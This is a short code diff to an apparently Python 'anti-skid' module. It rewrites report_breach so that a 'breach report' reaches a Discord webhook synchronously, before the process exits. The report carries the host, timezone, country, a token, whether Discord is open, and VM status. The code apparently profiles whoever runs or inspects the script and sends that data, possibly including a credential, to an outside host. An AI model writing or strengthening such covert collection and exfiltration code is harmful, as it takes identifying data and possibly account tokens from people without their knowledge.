@@ -267,7 +267,8 @@ def _send_discord(webhook_url: str, report: str, audit: dict,
 
 
 def report_breach(webhook_url, audit):
-    # builds report and fires it off in the background
+    # builds report and fires it off to discord
+    # does it sync so it actually sends before the process dies
     if not webhook_url:
         webhook_url = os.environ.get("ANTI_SKID_WEBHOOK")
 
@@ -287,11 +288,11 @@ def report_breach(webhook_url, audit):
         print(report_text, file=sys.stderr)
         return
 
-    # fire and forget in a thread
-    def _send():
-        ok = _send_discord(webhook_url, report_text, audit, host, tz, country, token, discord_open, vm)
-        if not ok:
-            print("[anti-skid] failed to send webhook rip", file=sys.stderr)
-
-    t = threading.Thread(target=_send, daemon=True, name="anti-skid-webhook")
-    t.start()
+    # send it now (sync, not a thread — process is about to die anyway)
+    print("[anti-skid] sending breach report to discord...", file=sys.stderr)
+    ok = _send_discord(webhook_url, report_text, audit, host, tz, country, token, discord_open, vm)
+    if ok:
+        print("[anti-skid] breach report sent", file=sys.stderr)
+    else:
+        print("[anti-skid] failed to send webhook rip, dumping report:\n", file=sys.stderr)
+        print(report_text, file=sys.stderr)
